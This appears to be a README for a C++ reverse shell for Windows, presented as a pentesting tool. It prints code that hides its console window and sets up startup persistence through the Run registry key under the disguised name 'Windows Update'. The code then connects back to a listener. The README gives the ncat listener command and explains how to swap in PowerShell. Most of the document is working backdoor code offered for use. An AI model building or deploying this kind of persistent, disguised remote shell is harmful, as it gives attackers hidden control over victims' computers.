# reverse-shell
a basic reverse shell for windows operating systems in c++

# This is not malware this is for pentesting!!!
Here is the initialize shell code
```cpp
    FreeConsole();

    HKEY hkey = NULL;
    LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);     
    LONG status = RegSetValueEx(hkey, "Windows Update", 0, REG_SZ, (BYTE*)argv[0], (std::string(argv[0]).size() + 1) * sizeof(wchar_t));

    char host[] = "localhost";
    int port = 0xDEAD;
    RunShell(host, port);
```

# Access
You can access the shell by opening a port and hosting a ncat server
```cpp
nc -lvp 57005
```
Then it should say
```yml
Ncat: Connection from 46.165.252.184
```
Then press enter and you got a shell

# Features
Infect Windows Startup with registry
Reverse Shell via raw sockets
If you want to pop something else than cmd you change this line
```cpp
char Process[8] = "cmd.exe";
```

to for example powershell
```cpp
char Process[15] = "powershell.exe";
```

